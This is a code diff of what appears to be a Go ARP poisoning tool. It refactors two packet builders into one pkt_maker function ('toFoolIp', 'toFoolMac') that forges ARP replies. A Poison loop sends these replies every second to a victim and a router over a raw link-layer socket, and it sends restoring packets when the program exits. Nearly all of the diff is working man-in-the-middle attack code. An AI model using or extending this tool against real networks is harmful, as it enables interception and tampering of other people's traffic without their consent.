@@ -6,7 +6,7 @@ import (
 	"syscall"
 	"time"
 	"os/signal"
-	"os"	
+	"os"
 )
 
 func Poison (args [][]byte, inter *net.Interface) {
@@ -22,12 +22,12 @@ func Poison (args [][]byte, inter *net.Interface) {
 	for {
 		select {
 		case <-chanSig:
-			sendPacket(fd, pkt_for_victim(args[4], args[5], args[2], args[3]), &addr)
-			sendPacket(fd, pkt_for_router(args[0], args[1], args[4], args[5]), &addr)
+			sendPacket(fd, pkt_maker(args[4], args[5], args[1], args[2], args[3]), &addr)
+			sendPacket(fd, pkt_maker(args[2], args[3], args[1], args[4], args[5]), &addr)
 			os.Exit(0)
 		default:
-			sendPacket(fd, pkt_for_victim(args[4], args[1], args[2], args[3]), &addr)
-			sendPacket(fd, pkt_for_router(args[2], args[1], args[4], args[5]), &addr)
+			sendPacket(fd, pkt_maker(args[4], args[1], args[1], args[2], args[3]), &addr)
+			sendPacket(fd, pkt_maker(args[2], args[1], args[1], args[4], args[5]), &addr)
 			time.Sleep(time.Second)
 		}
 	}
@@ -40,8 +40,7 @@ func sendPacket(fd int, packet []byte, address *syscall.SockaddrLinklayer) {
 	}
 }
 
-//make it available for wifi interception too
-func pkt_for_victim(routerIp, sourceMac, targetIp, targetMac []byte) []byte {
+func pkt_maker(toFoolIp, toFoolMac, sourceMac, targetIp, targetMac []byte) []byte {
 	base_pack := []byte {
 		0x08, //type (arp)
 		0x06,
@@ -58,34 +57,9 @@ func pkt_for_victim(routerIp, sourceMac, targetIp, targetMac []byte) []byte {
 	pack = append(pack, targetMac...)
 	pack = append(pack, sourceMac...)
 	pack = append(pack, base_pack...)
-	pack = append(pack, sourceMac...)
-	pack = append(pack, routerIp...)
+	pack = append(pack, toFoolMac...)
+	pack = append(pack, toFoolIp...)
 	pack = append(pack, targetMac...)
 	pack = append(pack, targetIp...)
-	return pack
-}
-
-//maybe before send this to router we need to send ping packet so that router has our arp address in its table
-func pkt_for_router(targetIp, sourceMac, routerIp, routerMac []byte) []byte {
-	base_pack := []byte {
-		0x08, //type (arp)
-		0x06,
-		0x00, //ethernet
-		0x01,
-		0x08, //IP type
-		0x00,
-		0x06, //mac len
-		0x04, //IP len
-		0x00, //operation(response)
-		0x02,
-	}
-	pack := make([]byte, 0, 42)
-	pack = append(pack, routerMac...)
-	pack = append(pack, sourceMac...)
-	pack = append(pack, base_pack...)
-	pack = append(pack, sourceMac...)
-	pack = append(pack, targetIp...)
-	pack = append(pack, routerMac...)
-	pack = append(pack, routerIp...)
 	return pack
 }
